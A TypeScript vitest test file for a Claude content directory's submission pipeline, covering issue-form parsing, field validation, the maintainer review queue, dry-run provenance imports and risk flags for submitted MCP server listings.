import { describe, expect, it } from "vitest";
import { execFileSync } from "node:child_process";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";

import {
  buildSubmissionQueue,
  buildSubmissionIssueDraft,
  isLikelyAffiliateUrl,
  looksLikeSubmissionIssue,
  parseIssueFormBody,
  recommendedSubmissionLabels,
  submissionQueueStatus,
  submissionStaleState,
  validateSubmission,
} from "@heyclaude/registry/submission";
import {
  analyzeDirectContentRisk,
  analyzeIssueSubmissionRisk,
  formatSubmissionRiskMarkdown,
} from "@heyclaude/registry/submission-risk";
import { categorySpec } from "@heyclaude/registry";
import { deriveSeoFields } from "@heyclaude/registry/content-schema";
import {
  buildIssueTemplateSpec,
  buildSubmissionFieldModel,
} from "@heyclaude/registry/submission-spec";
import { submissionLabelsForCategory } from "@heyclaude/registry/submission-labels";

const repoRoot = path.resolve(import.meta.dirname, "..");

function issue(body: string, labels = ["content-submission"]) {
  return {
    body,
    labels: labels.map((name) => ({ name })),
    title: "Submit MCP: example",
    number: 1,
    url: "https://github.com/owner/repo/issues/1",
    author: { login: "contributor" },
    updatedAt: "2026-04-26T00:00:00Z",
  };
}

function importSubmissionDryRun(
  issuePayload: Record<string, unknown>,
  env: Record<string, string> = {},
) {
  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), "heyclaude-issue-"));
  const issuePath = path.join(tmpDir, "issue.json");
  fs.writeFileSync(issuePath, `${JSON.stringify(issuePayload, null, 2)}\n`);
  return execFileSync(
    process.execPath,
    [
      "scripts/import-submission-issue.mjs",
      "--issue-json",
      issuePath,
      "--dry-run",
    ],
    {
      cwd: repoRoot,
      env: { ...process.env, ...env },
      encoding: "utf8",
    },
  );
}

describe("submission intake", () => {
  it("derives web form and issue template fields from registry specs", () => {
    const model = buildSubmissionFieldModel("skills");
    expect(model).toBeTruthy();
    expect(
      model?.fields.some(
        (field) => field.id === "skill_type" && field.required,
      ),
    ).toBe(true);
    expect(
      model?.fields.some(
        (field) => field.id === "download_url" && !field.required,
      ),
    ).toBe(true);
    expect(
      model?.fields.some(
        (field) =>
          field.id === "contact_email" &&
          field.label === "Public contact" &&
          !field.required,
      ),
    ).toBe(true);
    expect(
      model?.fields.some(
        (field) => field.id === "brand_domain" && !field.required,
      ),
    ).toBe(true);

    const issueTemplate = buildIssueTemplateSpec("mcp");
    expect(issueTemplate).toBeTruthy();
    expect(issueTemplate?.labels).toContain("content-submission");
    expect(issueTemplate?.labels).toEqual(submissionLabelsForCategory("mcp"));
    expect(
      issueTemplate?.fields.some(
        (field) => field.id === "install_command" && field.required,
      ),
    ).toBe(true);
  });

  it("builds website submission issues from the canonical field model", () => {
    const draft = buildSubmissionIssueDraft({
      name: "Website Intake MCP",
      slug: "website-intake-mcp",
      category: "mcp",
      contact_email: "@maintainer",
      docs_url: "https://example.com/docs",
      brand_name: "Example",
      brand_domain: "example.com",
      description:
        "MCP server submitted directly through the website intake API.",
      card_description: "Website intake API coverage.",
      install_command: "npx -y website-intake-mcp",
      usage_snippet:
        "claude mcp add website-intake-mcp -- npx -y website-intake-mcp",
    });

    expect(draft.title).toBe("Submit MCP Server: Website Intake MCP");
    expect(draft.body).toContain("### Name");
    expect(draft.body).toContain("Website Intake MCP");
    expect(draft.body).toContain("### Brand domain");
    expect(draft.body).toContain("example.com");
    expect(draft.labels).toEqual([
      "content-submission",
      "needs-review",
      "community-mcp",
    ]);
    expect(validateSubmission(draft).ok).toBe(true);
  });

  it("imports direct GitHub submissions with content-level provenance", () => {
    const output = importSubmissionDryRun(
      {
        number: 777,
        html_url: "https://github.com/JSONbored/claudepro-directory/issues/777",
        created_at: "2026-04-28T12:34:56Z",
        user: {
          login: "content-author",
          html_url: "https://github.com/content-author",
        },
        body: buildSubmissionIssueDraft({
          name: "Provenance MCP",
          slug: "provenance-mcp",
          category: "mcp",
          author: "Example Team",
          docs_url: "https://example.com/docs",
          description:
            "MCP server submitted through a direct GitHub issue with provenance.",
          card_description: "Direct GitHub issue provenance coverage.",
          install_command: "npx -y provenance-mcp",
          usage_snippet:
            "claude mcp add provenance-mcp -- npx -y provenance-mcp",
        }).body,
        labels: [{ name: "content-submission" }, { name: "community-mcp" }],
      },
      {
        SUBMISSION_REVIEWED_BY: "JSONbored",
        SUBMISSION_REVIEWED_AT: "2026-04-29T00:00:00Z",
      },
    );

    expect(output).toContain("submittedBy: content-author");
    expect(output).toContain(
      'submittedByUrl: "https://github.com/content-author"',
    );
    expect(output).toContain('submittedAt: "2026-04-28T12:34:56Z"');
    expect(output).toContain("submissionIssueNumber: 777");
    expect(output).toContain(
      'submissionIssueUrl: "https://github.com/JSONbored/claudepro-directory/issues/777"',
    );
    expect(output).toContain("reviewedBy: JSONbored");
    expect(output).toContain("claimStatus: unclaimed");
  });

  it("does not publish website token owners as submitters", () => {
    const output = importSubmissionDryRun({
      number: 778,
      html_url: "https://github.com/JSONbored/claudepro-directory/issues/778",
      created_at: "2026-04-28T12:34:56Z",
      user: {
        login: "JSONbored",
        html_url: "https://github.com/JSONbored",
      },
      body: buildSubmissionIssueDraft({
        name: "Website Token MCP",
        slug: "website-token-mcp",
        category: "mcp",
        author: "Example Team",
        contact_email: "maintainer@example.com",
        submitted_via: "website",
        docs_url: "https://example.com/docs",
        description:
          "MCP server submitted through the website with private contact details.",
        card_description: "Website token provenance privacy coverage.",
        install_command: "npx -y website-token-mcp",
        usage_snippet:
          "claude mcp add website-token-mcp -- npx -y website-token-mcp",
      }).body,
      labels: [{ name: "content-submission" }, { name: "community-mcp" }],
    });

    expect(output).not.toContain("submittedBy:");
    expect(output).not.toContain("submittedByUrl:");
    expect(output).not.toContain("submittedBy: JSONbored");
    expect(output).not.toContain(
      "submittedByUrl: https://github.com/JSONbored",
    );
    expect(output).not.toContain("maintainer@example.com");
  });

  it("normalizes brand domains and rejects unsafe brand values", () => {
    const shapedIssue = issue(`### Name
Brand Intake MCP

### Slug
brand-intake-mcp

### Category
mcp

### Description
MCP server submitted with optional brand metadata.

### Card description
Brand metadata coverage.

### Brand name
Asana

### Brand domain
https://www.asana.com/docs

### Install command
npx -y brand-intake-mcp

### Usage snippet
claude mcp add brand-intake-mcp -- npx -y brand-intake-mcp`);

    const report = validateSubmission(shapedIssue);
    expect(report.ok).toBe(true);
    expect(report.fields.brand_domain).toBe("asana.com");

    const invalid = validateSubmission(
      issue(`### Name
Broken Brand MCP

### Slug
broken-brand-mcp

### Category
mcp

### Description
MCP server submitted with invalid brand metadata.

### Card description
Invalid brand metadata coverage.

### Brand domain
not a domain

### Install command
npx -y broken-brand-mcp

### Usage snippet
claude mcp add broken-brand-mcp -- npx -y broken-brand-mcp`),
    );
    expect(invalid.ok).toBe(false);
    expect(invalid.errors).toContain(
      "brand_domain must be a canonical domain such as asana.com",
    );
  });

  it("keeps checked-in GitHub issue templates aligned with registry specs", () => {
    for (const category of categorySpec.submissionOrder) {
      const template = buildIssueTemplateSpec(category);
      expect(template).toBeTruthy();
      const templatePath = path.join(
        repoRoot,
        ".github",
        "ISSUE_TEMPLATE",
        template!.template,
      );
      const source = fs.readFileSync(templatePath, "utf8");
      for (const label of template!.labels) {
        expect(source).toContain(`  - "${label}"`);
      }
      for (const field of template!.fields.filter((field) => field.required)) {
        expect(source).toContain(`    id: ${field.id}`);
        expect(source).toContain("      required: true");
      }
      expect(source).toContain(
        "maintainers review accepted submissions before an import PR is opened",
      );
      expect(source).toContain(
        "Do not open a separate README change for issue submissions",
      );
      expect(source).toContain(
        "I understand accepted imports regenerate the README and registry artifacts automatically",
      );
      expect(source).toContain("not affiliate, referral, or tracking URLs");
    }
  });

  it("normalizes category aliases and slugs", () => {
    const report = validateSubmission(
      issue(`### Name
Prompt-to-asset

### Slug
Prompt-to-asset

### Category
Mcp

### Public contact
dev@example.com

### Description
MCP server that generates visual assets.

### Card description
Generate app icons and favicons.

### Install command
npx -y prompt-to-asset

### Usage snippet
claude mcp add prompt-to-asset -- npx -y prompt-to-asset`),
    );
    expect(report.ok).toBe(true);
    expect(report.category).toBe("mcp");
    expect(report.fields.slug).toBe("prompt-to-asset");
  });

  it("does not rely on the retired submission label", () => {
    expect(
      looksLikeSubmissionIssue({
        body: "This old label by itself should not trigger the queue.",
        labels: [{ name: "submission" }],
        title: "General question",
      }),
    ).toBe(false);

    const shapedIssue = issue(
      `### Name
ContrastAPI

### Slug
ContrastAPI

### Category
mcp-server

### Description
MCP server for contrast checks.

### Card description
Check color contrast from Claude.

### Install command
npx -y contrastapi

### Usage snippet
claude mcp add contrastapi -- npx -y contrastapi`,
      ["submission"],
    );
    expect(looksLikeSubmissionIssue(shapedIssue)).toBe(true);
    expect(validateSubmission(shapedIssue).ok).toBe(true);
  });

  it("detects and labels unlabeled submission-shaped issues", () => {
    const unlabeled = issue(
      `### Name
Prompt-to-asset

### Slug
Prompt-to-asset

### Category
Mcp

### Public contact
dev@example.com

### Description
MCP server that generates visual assets.

### Card description
Generate app icons and favicons.

### Install command
npx -y prompt-to-asset

### Usage snippet
claude mcp add prompt-to-asset -- npx -y prompt-to-asset`,
      [],
    );
    expect(looksLikeSubmissionIssue(unlabeled)).toBe(true);
    expect(validateSubmission(unlabeled).ok).toBe(true);
    expect(recommendedSubmissionLabels(unlabeled)).toEqual([
      "community-mcp",
      "content-submission",
      "needs-review",
      "source-needs-verification",
    ]);
  });

  it("builds a maintainer submission queue", () => {
    const valid = issue(`### Name
ContrastAPI

### Slug
contrastapi

### Category
mcp

### Public contact
dev@example.com

### GitHub URL
https://github.com/example/contrastapi

### Description
Security MCP.

### Card description
Security MCP.

### Install command
claude mcp add contrastapi --transport http https://example.com/mcp

### Usage snippet
claude mcp list`);
    const invalid = issue(`### Name
Unslop

### Slug
unslop

### Category
skills

### Public contact
dev@example.com

### Description
Writing cleanup.

### Card description
Writing cleanup.

### Usage snippet
npx unslop --help`);
    const queue = buildSubmissionQueue(
      [valid, invalid, { title: "Question" }],
      { now: "2026-04-30T00:00:00Z" },
    );
    expect(queue.count).toBe(2);
    expect(queue.summary.importReady).toBe(1);
    expect(queue.summary.needsChanges).toBe(1);
    expect(queue.entries[0].status).toBe("import_ready");
    expect(queue.entries[0].importPath).toBe("content/mcp/contrastapi.mdx");
    expect(queue.entries[1].status).toBe("needs_author_input");
    expect(queue.entries[1].actionDue).toBe("author_input");
  });

  it("tracks stale author-input states without touching maintainer-approved issues", () => {
    const invalidBody = `### Name
Unslop

### Slug
unslop

### Category
skills

### Public contact
dev@example.com

### Description
Writing cleanup.

### Card description
Writing cleanup.

### Usage snippet
npx unslop --help`;
    const fresh = issue(invalidBody, ["content-submission"]);
    const reminderDue = {
      ...issue(invalidBody, ["content-submission"]),
      updatedAt: "2026-04-20T00:00:00Z",
    };
    const closeEligible = {
      ...issue(invalidBody, ["content-submission", "stale-submission"]),
      updatedAt: "2026-04-10T00:00:00Z",
    };
    const approved = {
      ...issue(invalidBody, ["content-submission", "import-approved"]),
      updatedAt: "2026-04-10T00:00:00Z",
    };

    const report = validateSubmission(fresh);
    expect(report.ok).toBe(false);
    expect(
      submissionQueueStatus(report, fresh, { now: "2026-04-30T00:00:00Z" }),
    ).toBe("needs_author_input");
    expect(
      submissionStaleState(reminderDue, validateSubmission(reminderDue), {
        now: "2026-04-30T00:00:00Z",
      }),
    ).toBe("reminder_due");
    expect(
      submissionQueueStatus(validateSubmission(closeEligible), closeEligible, {
        now: "2026-04-30T00:00:00Z",
      }),
    ).toBe("close_eligible");
    expect(
      submissionQueueStatus(validateSubmission(approved), approved, {
        now: "2026-04-30T00:00:00Z",
      }),
    ).toBe("maintainer_review");
  });

  it("separates source verification from author-input failures", () => {
    const sourceProblem = issue(
      `### Name
Source Review MCP

### Slug
source-review-mcp

### Category
mcp

### Public contact
dev@example.com

### GitHub URL
https://github.com/example/source-review-mcp

### Description
MCP server with a source that maintainers marked for verification.

### Card description
Source verification coverage.

### Install command
npx -y source-review-mcp

### Usage snippet
claude mcp add source-review-mcp -- npx -y source-review-mcp`,
      ["content-submission", "source-needs-verification"],
    );
    const report = validateSubmission(sourceProblem);
    expect(report.ok).toBe(true);
    expect(
      submissionQueueStatus(report, sourceProblem, {
        now: "2026-04-30T00:00:00Z",
      }),
    ).toBe("source_needs_verification");
    expect(recommendedSubmissionLabels(sourceProblem)).toContain(
      "source-needs-verification",
    );
  });

  it("rejects missing required category fields", () => {
    const report = validateSubmission(
      issue(`### Name
Unslop

### Slug
Unslop

### Category
Skill

### Public contact
dev@example.com

### Description
Clean AI writing patterns.

### Card description
Clean AI writing patterns.

### Install command
npx -y unslop

### Usage snippet
npx unslop --help`),
    );
    expect(report.ok).toBe(false);
    expect(report.category).toBe("skills");
    expect(report.errors).toContain("Missing required field: skill_type");
  });

  it("rejects community requests for local package hosting", () => {
    const report = validateSubmission(
      issue(`### Name
Local Package

### Slug
local-package

### Category
skills

### Public contact
dev@example.com

### Description
Test local package.

### Card description
Test local package.

### Download URL (optional)
/downloads/skills/local-package.zip

### Skill type
general

### Skill level
advanced

### Verification status
draft

### Usage snippet
Use it.`),
    );
    expect(report.ok).toBe(false);
    expect(report.errors).toContain(
      "Community submissions cannot request local /downloads hosting",
    );
  });

  it("rejects contributor affiliate and referral URLs", () => {
    expect(isLikelyAffiliateUrl("https://example.com/?affiliate=creator")).toBe(
      true,
    );
    const report = validateSubmission(
      issue(`### Name
Referral Tool

### Slug
referral-tool

### Category
mcp

### Public contact
dev@example.com

### GitHub URL
https://github.com/example/referral-tool?referral=affiliate

### Description
Referral test.

### Card description
Referral test.

### Install command
npx referral-tool

### Usage snippet
claude mcp add referral-tool -- npx referral-tool`),
    );
    expect(report.ok).toBe(false);
    expect(report.errors).toContain(
      "Contributor submissions cannot include affiliate/referral URLs: github_url",
    );
  });

  it("rejects malformed or non-https contributor URLs", () => {
    const report = validateSubmission(
      issue(`### Name
Insecure URL Tool

### Slug
insecure-url-tool

### Category
mcp

### Public contact
dev@example.com

### GitHub URL
http://example.com/repo

### Description
MCP server with an insecure source URL.

### Card description
Insecure source URL test.

### Install command
npx insecure-url-tool

### Usage snippet
claude mcp add insecure-url-tool -- npx insecure-url-tool`),
    );
    expect(report.ok).toBe(false);
    expect(report.errors).toContain("github_url must be a valid https URL");
  });

  it("derives bounded SEO metadata for imported UGC", () => {
    const seo = deriveSeoFields(
      {
        title: "Website Intake MCP",
        description:
          "MCP server submitted directly through the website intake API for reviewable community contributions.",
        tags: ["mcp", "submission", "community"],
      },
      "mcp",
    );

    expect(seo.seoTitle.length).toBeLessThanOrEqual(70);
    expect(seo.seoDescription.length).toBeLessThanOrEqual(160);
    expect(seo.keywords).toEqual(
      expect.arrayContaining(["mcp", "submission", "community", "claude"]),
    );
  });

  it("maps generic full copyable content headings into the required field", () => {
    const report = validateSubmission(
      issue(`### Name
Build Review Agent

### Slug
build-review-agent

### Category
agents

### Description
Specialized review agent for checking build logs and summarizing failures.

### Card description
Agent for build log review.

### Full copyable content
Review build logs, identify the failing step, and summarize the likely fix.`),
    );

    expect(report.ok).toBe(true);
    expect(report.fields.full_copyable_content).toContain("Review build logs");
  });

  it("preserves MCP config snippet headings during import", () => {
    const body = buildSubmissionIssueDraft({
      name: "Config Snippet MCP",
      slug: "config-snippet-mcp",
      category: "mcp",
      docs_url: "https://example.com/mcp",
      description:
        "Hosted MCP server submitted with a client configuration snippet.",
      card_description: "Config snippet import coverage.",
      install_command:
        "claude mcp add --transport http config-snippet https://example.com/mcp",
      usage_snippet: "claude mcp status config-snippet",
      config_snippet: `\`\`\`json
{
  "mcpServers": {
    "config-snippet": {
      "type": "http",
      "url": "https://example.com/mcp"
    }
  }
}
\`\`\``,
    }).body;

    const report = validateSubmission(issue(body));
    expect(report.ok).toBe(true);
    expect(report.fields.config_snippet).toContain('"mcpServers"');

    const output = importSubmissionDryRun({
      number: 779,
      html_url: "https://github.com/JSONbored/claudepro-directory/issues/779",
      created_at: "2026-05-10T00:00:00Z",
      user: {
        login: "content-author",
        html_url: "https://github.com/content-author",
      },
      body,
      labels: [{ name: "content-submission" }, { name: "community-mcp" }],
    });

    expect(output).toContain("configSnippet: |-");
    expect(output).toContain('"mcpServers"');
    expect(output).toContain('"url": "https://example.com/mcp"');
  });

  it("adds deterministic security/safety context to the maintainer queue", () => {
    const legal = issue(`### Name
Spain Legal by Legal Fournier

### Slug
legal-fournier-spain-legal-mcp

### Category
mcp

### Docs URL
https://legalfournier.com/en/mcp/spain-legal/

### Description
Read-only MCP server for Spain legal route screening, visa options, residency paths, and human handoff preparation.

### Card description
Read-only Spain legal MCP for immigration route screening.

### Install command
claude mcp add --transport http legal-fournier-spain-legal https://legalfournier.com/mcp/spain-legal

### Usage snippet
claude mcp status legal-fournier-spain-legal`);
    const memesio = issue(`### Name
Memesio MCP Server

### Slug
memesio-mcp-server

### Category
mcp

### Docs URL
https://memesio.com/developers/mcp

### Description
Hosted MCP endpoint for meme template discovery, captioned meme creation, and optional keyed AI meme generation.

### Card description
Hosted MCP for meme rendering and optional keyed AI actions.

### Install command
claude mcp add --transport http memesio https://memesio.com/api/mcp

### Usage snippet
Use optional x-api-key authentication for higher limits.`);
    const friday = issue(`### Name
Friday Studio

### Slug
friday-studio

### Category
agents

### GitHub URL
https://github.com/friday-platform/friday-studio

### Description
Agentic AI runtime and desktop app that runs a daemon, local workspace automation, MCP tools, and scheduled workflows.

### Card description
Agentic AI workspaces that run on schedule.

### Full copyable content
Clone the repository, run setup, then start the daemon and playground.`);
    const starWhisper = issue(`### Name
Christian Merjudio

### Slug
christian-merjudio

### Category
commands

### Description
StarWhisper is voice-to-text software for Windows with offline transcription, OpenAI API integration, and Pro plans.

### Card description
Free voice-to-text software for Windows.

### Command syntax
karloamalia

### Usage snippet
Free voice-to-text software for Windows.

### Full copyable content
Free voice-to-text software for Windows.`);
    const zkproofport = issue(`### Name
ZKProofport MCP

### Slug
zkproofport-mcp

### Category
mcp

### GitHub URL
https://github.com/zkproofport/proofport-ai

### Description
Zero-knowledge proof generation MCP for KYC, country, Google OIDC, wallet private keys, x402 USDC payments, and Nitro Enclave proving.

### Card description
ZK proof generation for identity claims.

### Install command
npm install -g @zkproofport-ai/mcp`);
    const macuse = issue(`### Name
Macuse

### Slug
macuse

### Category
mcp

### GitHub URL
https://github.com/macuseapp/macuse

### Description
Native macOS MCP server with Accessibility, Mail, Calendar, Messages, UI automation, and personal app access.

### Card description
macOS MCP automation for native apps.`);

    const queue = buildSubmissionQueue(
      [legal, memesio, friday, starWhisper, zkproofport, macuse],
      { now: "2026-05-09T00:00:00Z" },
    );

    expect(
      queue.entries.find(
        (entry) => entry.slug === "legal-fournier-spain-legal-mcp",
      )?.riskFlags,
    ).not.toContain("regulated_domain");
    expect(
      queue.entries.find((entry) => entry.slug === "memesio-mcp-server")
        ?.riskFlags,
    ).toContain("requires_credentials");
    expect(
      queue.entries.find((entry) => entry.slug === "friday-studio")?.riskFlags,
    ).not.toContain("possible_category_mismatch");
    expect(
      queue.entries.find((entry) => entry.slug === "friday-studio")?.riskFlags,
    ).toEqual(expect.arrayContaining(["local_or_personal_data_access"]));
    expect(
      queue.entries.find((entry) => entry.slug === "friday-studio")?.errors,
    ).toEqual(
      expect.arrayContaining([
        expect.stringContaining("tools/app listing flow"),
      ]),
    );
    expect(
      queue.entries.find((entry) => entry.slug === "christian-merjudio")
        ?.riskFlags,
    ).toContain("no_canonical_source");
    expect(
      queue.entries.find((entry) => entry.slug === "christian-merjudio")
        ?.riskFlags,
    ).not.toContain("promotion_or_paid_placement_language");
    expect(
      queue.entries.find((entry) => entry.slug === "christian-merjudio")
        ?.errors,
    ).toEqual(
      expect.arrayContaining([
        expect.stringContaining("tools/app listing flow"),
      ]),
    );
    expect(
      queue.entries.find((entry) => entry.slug === "zkproofport-mcp")
        ?.riskFlags,
    ).toContain("financial_or_identity_sensitive");
    expect(
      queue.entries.find((entry) => entry.slug === "macuse")?.riskFlags,
    ).toContain("local_or_personal_data_access");
  });

  it("routes hosted products and apps to tools listing review", () => {
    const bodyForCategory = (category: string) => `### Name
MultipleChat

### Slug
multiplechat

### Category
${category}

### Website URL
https://multiplechat.ai/

### Description
MultipleChat is a hosted SaaS product for running ChatGPT, Claude, Gemini, Grok, and Perplexity from one interface with Smart AI Processing.

### Card description
Multi-model AI workspace for verified answers.

### Full copyable content
Free to try with no credit card. Plans include an all-in-one subscription for document, presentation, Excel, and image tools.`;

    for (const category of ["agents", "mcp", "skills", "commands"]) {
      const report = validateSubmission(issue(bodyForCategory(category)));
      expect(report.ok).toBe(false);
      expect(report.errors).toEqual(
        expect.arrayContaining([
          expect.stringContaining("tools/app listing flow"),
        ]),
      );
    }
  });

  it("allows maintainer-approved tools issues with listing metadata", () => {
    const toolIssue = issue(
      `### Name
MultipleChat

### Slug
multiplechat

### Category
tools

### Website URL
https://multiplechat.ai/

### Features URL
https://multiplechat.ai/features

### Pricing model
freemium

### Disclosure
editorial

### Application category
WebApplication

### Operating system
Web

### Description
Hosted multi-model AI workspace for running ChatGPT, Claude, Gemini, Grok, and Perplexity from one interface.

### Card description
Multi-model AI workspace for verified answers.`,
      ["content-submission", "accepted"],
    );

    const report = validateSubmission(toolIssue);
    expect(report.ok).toBe(true);
    expect(report.category).toBe("tools");
    expect(report.fields.website_url).toBe("https://multiplechat.ai/");
    expect(report.fields.pricing_model).toBe("freemium");
  });

  it("formats direct content PR risk without executing submitted files", () => {
    const report = analyzeDirectContentRisk({
      sourceType: "external_direct",
      pullRequest: {
        number: 326,
        title: "Add Xquik MCP server listing",
        html_url: "https://github.com/JSONbored/claudepro-directory/pull/326",
        user: { login: "kriptoburak" },
      },
      contributor: {
        login: "kriptoburak",
        created_at: "2014-09-12T23:53:37Z",
        public_repos: 313,
      },
      files: [
        {
          filename: "content/mcp/xquik-mcp-server.mdx",
          status: "added",
          content: `---
title: Xquik MCP Server
slug: xquik-mcp-server
category: mcp
description: Remote MCP server for X and Twitter automation, tweet search, webhooks, and confirmation-gated posting.
submittedBy: kriptoburak
submittedByUrl: https://github.com/kriptoburak
repoUrl: https://github.com/Xquik-dev/x-twitter-scraper
documentationUrl: https://docs.xquik.com/mcp/overview
installCommand: "npx -y mcp-remote@0.1.38 https://xquik.com/mcp --header x-api-key:\${XQUIK_API_KEY}"
usageSnippet: "Use an API key for Xquik social media posting workflows."
---
## Security Notes
Review payloads before posting tweets, replies, DMs, or profile updates.`,
        },
      ],
    });

    expect(report.riskTier).toBe("high");
    expect(report.reviewFlags.map((flag) => flag.id)).toEqual(
      expect.arrayContaining([
        "requires_credentials",
        "external_write_capability",
      ]),
    );
    expect(report.recommendedLabels).toEqual(["risk-high"]);
    expect(report.provenanceStatus).toBe("passed");
    expect(report.effectiveContributor?.login).toBe("kriptoburak");
    expect(formatSubmissionRiskMarkdown(report)).toContain(
      "<!-- submission-risk-report -->",
    );
    expect(formatSubmissionRiskMarkdown(report)).toContain(
      "Submission security/safety review",
    );
  });

  it("warns when direct PR product listings are outside content/tools", () => {
    const report = analyzeDirectContentRisk({
      sourceType: "external_direct",
      pullRequest: {
        number: 327,
        title: "Add MultipleChat listing",
        html_url: "https://github.com/JSONbored/claudepro-directory/pull/327",
        user: { login: "multiplechat" },
      },
      files: [
        {
          filename: "content/agents/multiplechat.mdx",
          status: "added",
          content: `---
title: MultipleChat
slug: multiplechat
category: agents
description: Hosted SaaS product for running ChatGPT, Claude, Gemini, Grok, and Perplexity from one interface.
cardDescription: Multi-model AI workspace for verified answers.
submittedBy: multiplechat
submittedByUrl: https://github.com/multiplechat
websiteUrl: https://multiplechat.ai/
documentationUrl: https://multiplechat.ai/features
pricingModel: freemium
disclosure: editorial
applicationCategory: WebApplication
operatingSystem: Web
---
## Overview
Free to try with no credit card. Includes document, presentation, Excel, and image tools in one subscription.`,
        },
      ],
    });

    expect(report.riskTier).toBe("low");
    expect(report.classificationWarnings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ id: "tools_category_routing" }),
      ]),
    );
    expect(formatSubmissionRiskMarkdown(report)).toContain(
      "Classification warnings",
    );
  });

  it("accepts direct PR tools listings with required review metadata", () => {
    const report = analyzeDirectContentRisk({
      sourceType: "external_direct",
      pullRequest: {
        number: 328,
        title: "Add MultipleChat tools listing",
        html_url: "https://github.com/JSONbored/claudepro-directory/pull/328",
        user: { login: "multiplechat" },
      },
      files: [
        {
          filename: "content/tools/multiplechat.mdx",
          status: "added",
          content: `---
title: MultipleChat
slug: multiplechat
category: tools
description: Hosted multi-model AI workspace for running ChatGPT, Claude, Gemini, Grok, and Perplexity from one interface.
cardDescription: Multi-model AI workspace for verified answers.
submittedBy: multiplechat
submittedByUrl: https://github.com/multiplechat
websiteUrl: https://multiplechat.ai/
documentationUrl: https://multiplechat.ai/features
pricingModel: freemium
disclosure: editorial
applicationCategory: WebApplication
operatingSystem: Web
---
## Editorial notes
Review source claims and screenshots before publishing.`,
        },
      ],
    });

    expect(report.riskTier).toBe("low");
    expect(report.classificationWarnings).toEqual([]);
  });

  it("warns when direct content PRs include generated README changes", () => {
    const report = analyzeDirectContentRisk({
      sourceType: "external_direct",
      pullRequest: {
        number: 329,
        title: "Add Example MCP listing",
        html_url: "https://github.com/JSONbored/claudepro-directory/pull/329",
        user: { login: "contributor" },
      },
      files: [
        {
          filename: "content/mcp/example-mcp.mdx",
          status: "added",
          content: `---
title: Example MCP
slug: example-mcp
category: mcp
description: MCP server for testing generated README guidance.
submittedBy: contributor
submittedByUrl: https://github.com/contributor
repoUrl: https://github.com/example/example-mcp
documentationUrl: https://example.com/docs
installCommand: "npx -y example-mcp"
usageSnippet: "claude mcp add example-mcp -- npx -y example-mcp"
---
## Usage
Run the install command.`,
        },
        {
          filename: "README.md",
          status: "modified",
          content: "# HeyClaude\n\nManual catalog update.",
        },
      ],
    });

    expect(report.classificationWarnings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ id: "generated_readme_change" }),
      ]),
    );
    expect(formatSubmissionRiskMarkdown(report)).toContain(
      "README.md changes are not accepted in direct content PRs",
    );
  });

  it("attributes automation import PR risk to the original issue submitter", () => {
    const report = analyzeDirectContentRisk({
      sourceType: "automation_import",
      pullRequest: {
        number: 337,
        title: "feat(content): add mcp memesio-mcp-server",
        html_url: "https://github.com/JSONbored/claudepro-directory/pull/337",
        user: { login: "github-actions[bot]" },
        head: {
          ref: "automation/submission-325-memesio-mcp-server",
          repo: { full_name: "JSONbored/claudepro-directory" },
        },
      },
      pullRequestActor: {
        login: "github-actions[bot]",
        created_at: "2018-07-30T09:30:17Z",
      },
      contributor: {
        login: "github-actions[bot]",
        created_at: "2018-07-30T09:30:17Z",
      },
      submissionIssueContributors: [
        {
          issueNumber: 325,
          issue: { number: 325, user: { login: "vy35" } },
          contributor: {
            login: "vy35",
            html_url: "https://github.com/vy35",
            created_at: "2020-01-01T00:00:00Z",
            public_repos: 4,
          },
        },
      ],
      files: [
        {
          filename: "content/mcp/memesio-mcp-server.mdx",
          status: "added",
          content: `---
title: Memesio MCP Server
slug: memesio-mcp-server
category: mcp
description: Hosted meme generation MCP server that requires API credentials.
submittedBy: vy35
submittedByUrl: https://github.com/vy35
submissionIssueNumber: 325
submissionIssueUrl: https://github.com/JSONbored/claudepro-directory/issues/325
documentationUrl: https://memesio.com/developers/mcp
brandDomain: memesio.com
installCommand: "npx -y mcp-remote https://memesio.com/mcp --header x-api-key:\${MEMESIO_API_KEY}"
usageSnippet: "Use an API key to generate memes."
---
## Usage
Run the install command.`,
        },
        {
          filename: "README.md",
          status: "modified",
          content: "# HeyClaude\n\nGenerated catalog update.",
        },
      ],
    });

    const markdown = formatSubmissionRiskMarkdown(report);

    expect(report.provenanceStatus).toBe("passed");
    expect(report.effectiveContributor?.login).toBe("vy35");
    expect(report.pullRequestActor?.login).toBe("github-actions[bot]");
    expect(report.contributorSource).toBe("submission_issue_author");
    expect(report.trustSignals).toEqual(
      expect.arrayContaining([
        "Contributor analyzed: @vy35",
        "PR opened by: @github-actions[bot]",
        "Submission issue: #325",
      ]),
    );
    expect(report.classificationWarnings).not.toEqual(
      expect.arrayContaining([
        expect.objectContaining({ id: "generated_readme_change" }),
      ]),
    );
    expect(markdown).toContain("Contributor analyzed: @vy35");
    expect(markdown).toContain("PR opened by: @github-actions[bot]");
    expect(markdown).toContain(
      "content/mcp/memesio-mcp-server.mdx: by @vy35 via issue #325",
    );
  });

  it("uses content frontmatter provenance for same-repo maintainer PRs", () => {
    const report = analyzeDirectContentRisk({
      sourceType: "same_repo_direct",
      pullRequest: {
        number: 342,
        title: "fix(submission): attribute PR risk to original submitters",
        html_url: "https://github.com/JSONbored/claudepro-directory/pull/342",
        user: { login: "JSONbored" },
      },
      pullRequestActor: {
        login: "JSONbored",
        html_url: "https://github.com/JSONbored",
        created_at: "2019-05-01T00:00:00Z",
      },
      contributor: {
        login: "JSONbored",
        html_url: "https://github.com/JSONbored",
      },
      frontmatterContributors: [
        {
          login: "kriptoburak",
          html_url: "https://github.com/kriptoburak",
          created_at: "2014-09-12T23:53:37Z",
          public_repos: 313,
        },
      ],
      files: [
        {
          filename: "content/mcp/xquik-mcp-server.mdx",
          status: "modified",
          content: `---
title: Xquik MCP Server
slug: xquik-mcp-server
category: mcp
description: Remote MCP server for X and Twitter automation, tweet search, webhooks, and confirmation-gated posting.
submittedBy: kriptoburak
submittedByUrl: https://github.com/kriptoburak
importPrNumber: 326
importPrUrl: https://github.com/JSONbored/claudepro-directory/pull/326
repoUrl: https://github.com/Xquik-dev/x-twitter-scraper
documentationUrl: https://docs.xquik.com/mcp/overview
installCommand: "npx -y mcp-remote@0.1.38 https://xquik.com/mcp --header x-api-key:\${XQUIK_API_KEY}"
usageSnippet: "Use an API key for Xquik social media posting workflows."
---
## Security Notes
